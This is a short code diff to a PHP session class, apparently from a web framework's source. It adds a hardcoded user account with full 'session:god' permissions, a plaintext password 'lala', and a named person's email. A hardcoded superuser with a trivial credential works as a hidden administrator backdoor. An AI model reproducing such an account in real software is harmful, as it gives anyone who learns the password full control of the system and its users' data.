@@ -115,6 +115,14 @@ class core_session extends wf_agg {
 			"permissions" => array("session:god"),
 			"data" => array(),
 		));
+
+		$this->user_add(array(
+			"email" => "mp@binarysec.com",
+			"name" => "Martial Padié",
+			"password" => "lala",
+			"permissions" => array("session:god"),
+			"data" => array(),
+		));
 		
 		/* registre session preferences group */
 		$this->pref_session = $this->_core_pref->register_group(
